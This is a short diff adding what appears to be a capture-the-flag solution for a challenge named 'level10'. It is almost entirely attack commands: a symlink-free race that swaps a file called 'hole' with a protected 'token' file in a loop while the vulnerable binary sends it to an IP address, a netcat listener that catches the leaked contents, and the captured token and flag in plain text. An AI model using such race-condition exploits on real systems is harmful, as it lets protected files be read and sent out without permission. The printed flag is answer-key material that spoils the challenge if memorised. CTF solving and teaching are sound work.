@@ -1,0 +1,5 @@
+step 0: chmod 777 . && touch hole && chmod 777 *
+step 1: while true; do mv hole tmp && mv token hole && mv tmp token; done
+step 2: while true; do ./level10 hole 10.12.100.201; done
+step 3: nc -lk 6969 woupa2yuojeeaaed06riuj63c
+flag :  feulo4b72j7edeahuete3no7c
